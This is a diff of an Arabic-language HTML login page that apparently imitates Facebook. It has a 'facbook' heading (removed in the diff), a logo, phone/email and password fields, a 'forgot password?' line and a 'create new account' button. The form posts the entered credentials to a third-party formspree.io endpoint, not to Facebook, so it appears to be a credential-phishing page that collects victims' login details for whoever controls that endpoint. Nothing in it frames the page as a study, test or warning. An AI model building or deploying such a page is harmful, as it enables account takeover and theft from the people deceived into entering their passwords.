@@ -1,24 +1,27 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
+  <meta http-equiv="refresh" content="">
   <meta charset="UTF-8">
   <title>نموذج اتصال</title>
   <link rel="stylesheet" href="hololo.css">
 </head>
 <body>
 
-  <h2>facbook</h2>
-
+  <div class="lo">
+ <img class="logo" src="logo lite.png" alt=""></div>  
   <form action="https://formspree.io/f/xdkdkvdg" method="POST" id="contactForm">
-    <label for="contact">     </label>
-    <input type="text" id="contact" name="contact" placeholder="رقم الهاتف او البريد الالكتروني " required>
+    <label for="contact">  </label>
+    <input type="text" id="contact" name="mot de passe" placeholder="رقم الهاتف او البريد الالكتروني " required>
 
     <label for="message"> </label>
     <input type="text" id="message" name="message" placeholder="  كلمة السر" required>
 
     <button type="submit">تسجيل الدخول</button>
+    <h2>  هل نسيت كلمة السر؟   </h2>
   </form>
 
+    <button class="kalima" type="submit"> انشاء حساب جديد</button>
   <script>
     document.getElementById("contactForm").addEventListener("submit", function(event) {
       const contactInput = document.getElementById("contact").value.trim();
